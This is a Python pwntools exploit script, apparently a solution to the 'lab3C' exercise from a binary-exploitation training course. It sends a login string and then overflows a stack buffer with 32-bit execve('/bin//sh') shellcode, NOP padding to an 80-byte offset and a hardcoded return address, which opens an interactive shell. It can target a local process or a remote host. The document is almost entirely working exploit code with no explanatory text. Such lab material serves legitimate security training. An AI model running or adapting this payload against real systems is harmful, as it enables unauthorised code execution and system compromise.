#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab3C')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+228
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 80
    buf_addr = 0xffffce2c
    shellcode = asm(
        """
            execve:
                xor eax, eax
                push eax
                push 0x68732f2f
                push 0x6e69622f
                mov ebx, esp
                xor ecx, ecx
                xor edx, edx
                push 0xb
                pop eax
                int 0x80
        """
    )

    payload = shellcode.ljust(offset, b'\x90') + p32(buf_addr)

    io.sendline(b"rpisec")
    io.sendline(payload)
    io.clean()


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

